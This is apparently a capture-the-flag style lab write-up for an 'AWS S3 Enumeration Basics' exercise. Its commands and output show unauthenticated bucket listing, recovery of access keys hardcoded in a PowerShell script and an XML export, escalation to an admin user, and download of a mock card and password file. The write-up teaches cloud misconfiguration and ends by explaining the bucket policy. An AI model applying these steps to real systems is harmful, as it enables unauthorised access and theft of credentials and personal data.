---
title: AWS S3 Enumeration Basics
description: AWS S3 Enumeration Basics
image:
  path: aws.png
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
It's your first day on the red team, and you've been tasked with examining a website that was found in a phished employee's bookmarks. Check it out and see where it leads! In scope is the company's infrastructure, including cloud services.

Learning outcomes

- Familiarity with the AWS CLI
- Basic S3 enumeration and credential exfiltration
- An awareness of how this scenario could be been prevented

# Walkthrough

URL leads to website

![](aws-s3-enumeration-basics-1.png)

If we check the source code, we see that there links to [S3 bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html), which is a service that provides object-based storage, where data is stored inside S3 buckets in distinct units called objects instead of files.

![](aws-s3-enumeration-basics-2.png)

We can try visiting `https://s3.amazonaws.com/dev.huge-logistics.com/`, but it doesn't work

![](aws-s3-enumeration-basics-3.png)

We can try enumerating with [aws cli](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum.html#enumeration)
```
└─$ aws s3 ls s3://dev.huge-logistics.com --no-sign-request
                           PRE admin/
                           PRE migration-files/
                           PRE shared/
                           PRE static/
2023-10-16 23:00:47       5347 index.html
```

We can list the directories, but we can't list directories
```
└─$ aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied

```

The only directory we can list is `shared`
```
└─$ aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
2023-10-16 21:08:33          0 
2023-10-16 21:09:01        993 hl_migration_project.zip

```

Let's download the archive
```
└─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
```

Unzip and check the content
```
└─$ unzip hl_migration_project.zip 
Archive:  hl_migration_project.zip
  inflating: migrate_secrets.ps1  
```
```
└─$ cat migrate_secrets.ps1 
# AWS Configuration
$accessKey = "AKIA3SFMDAPOWOWKXEHU"
$secretKey = "<REDACTED>"
$region = "us-east-1"

# Set up AWS hardcoded credentials
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

# Set the AWS region
Set-DefaultAWSRegion -Region $region

# Read the secrets from export.xml
[xml]$xmlContent = Get-Content -Path "export.xml"

# Output log file
$logFile = "upload_log.txt"

# Error handling with retry logic
function TryUploadSecret($secretName, $secretValue) {
    $retries = 3
    while ($retries -gt 0) {
        try {
            $result = New-SECSecret -Name $secretName -SecretString $secretValue
            $logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"
            Write-Output $logEntry
            Add-Content -Path $logFile -Value $logEntry
            return $true
        } catch {
            $retries--
            Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"
        }
    }
    return $false
}

foreach ($secretNode in $xmlContent.Secrets.Secret) {
    # Implementing concurrency using jobs
    Start-Job -ScriptBlock {
        param($secretName, $secretValue)
        TryUploadSecret -secretName $secretName -secretValue $secretValue
    } -ArgumentList $secretNode.Name, $secretNode.Value
}

# Wait for all jobs to finish
$jobs = Get-Job
$jobs | Wait-Job

# Retrieve and display job results
$jobs | ForEach-Object {
    $result = Receive-Job -Job $_
    if (-not $result) {
        Write-Error "Failed to upload secret: $($_.Name) after multiple retries."
    }
    # Clean up the job
    Remove-Job -Job $_
}

Write-Output "Batch upload complete!"


# Install-Module -Name AWSPowerShell -Scope CurrentUser -Force
# .\migrate_secrets.ps1       
```

We find keys in the script and the region, let's authenticate
```
└─$ aws configure                                                                            
AWS Access Key ID [****************3YSI]: AKIA3SFMDAPOWOWKXEHU
AWS Secret Access Key [****************Inrh]: <REDACTED>
Default region name [us-west-1]: us-east-1
Default output format [None]: 
```

Also there's another way to know the region
```
└─$ curl -I https://s3.amazonaws.com/dev.huge-logistics.com/
HTTP/1.1 403 Forbidden
x-amz-bucket-region: us-east-1
x-amz-request-id: ZGHFPT2B52AKKCZ7
x-amz-id-2: Fn8QLHFq1TgGsC6qWB+WIN7TBtsdUrCv+s5+YJ4fYfeXLg7YmeWCIOGODvpog8iOXQ7EE3ZR+Oc=
Content-Type: application/xml
Transfer-Encoding: chunked
Date: Sun, 10 Aug 2025 18:07:46 GMT
Server: AmazonS3
```

We can confirm that we successfully logged in as `pam-test` user
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}

```

With this credentials we can list `/admin` directory, but unfortunately can't download anything from it
```
└─$ aws s3 ls s3://dev.huge-logistics.com/admin/
2023-10-16 21:08:38          0 
2024-12-02 20:57:44         32 flag.txt
2023-10-17 02:24:07       2425 website_transactions_export.csv

```


```
└─$ aws s3 ls s3://dev.huge-logistics.com/migration-files/
2023-10-16 21:08:47          0 
2023-10-16 21:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 21:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 21:09:27       1853 migrate_secrets.ps1
2023-10-17 00:00:13       2494 test-export.xml

```

Luckily we can download from `migration-files` directory
```
└─$ aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml .
download: s3://dev.huge-logistics.com/migration-files/test-export.xml to ./test-export.xml
```

Inside we find another AWS key
```
└─$ cat test-export.xml                               
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
<SNIP>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey><REDACTED></SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
<SNIP>
</CredentialsExport>

```

After authenticating with new credentials, we logged in as `it-admin` user
```
└─$ aws sts get-caller-identity                                                
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}

```

Now we can successfully capture our flag and confidential data
```
└─$ aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv -
network,credit_card_number,cvv,expiry_date,card_holder_name,validation,username,password,ip_address
Visa,4055497191304,386,5/2021,Hunter Miller,,hunter_m,password123,34.56.78.90
<SNIP>
```

We can check the policies for the bucket
```
└─$ aws s3api get-bucket-policy --bucket dev.huge-logistics.com | jq -r '.Policy | fromjson'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": [
        "arn:aws:s3:::dev.huge-logistics.com/shared/*",
        "arn:aws:s3:::dev.huge-logistics.com/index.html",
        "arn:aws:s3:::dev.huge-logistics.com/static/*"
      ]
    },
    {
      "Sid": "ListBucketRootAndShared",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:ListBucket",
      "Resource": "arn:aws:s3:::dev.huge-logistics.com",
      "Condition": {
        "StringEquals": {
          "s3:prefix": [
            "",
            "shared/",
            "static/"
          ],
          "s3:delimiter": "/"
        }
      }
    },
    {
      "Sid": "AllowAllExceptAdmin",
      "Effect": "Allow",
      "Principal": {
        "AWS": [
          "arn:aws:iam::794929857501:user/it-admin",
          "arn:aws:iam::794929857501:user/pam-test"
        ]
      },
      "Action": [
        "s3:Get*",
        "s3:List*"
      ],
      "Resource": [
        "arn:aws:s3:::dev.huge-logistics.com",
        "arn:aws:s3:::dev.huge-logistics.com/*"
      ]
    },
    {
      "Sid": "ExplicitDenyAdminAccess",
      "Effect": "Deny",
      "Principal": {
        "AWS": "arn:aws:iam::794929857501:user/pam-test"
      },
      "Action": "s3:*",
      "Resource": "arn:aws:s3:::dev.huge-logistics.com/admin/*"
    }
  ]
}

```

> If we check the policy, we can see why AWS CLI worked, where browser did not. The policy only allows s3:ListBucket if the request includes the parameters `prefix=` (even if empty) and `delimiter=/`. Now if we add parameters to url and visit it, we can see the directories `https://s3.amazonaws.com/dev.huge-logistics.com/?prefix=&delimiter=/`
{: .prompt-info }

![](aws-s3-enumeration-basics-4.png)
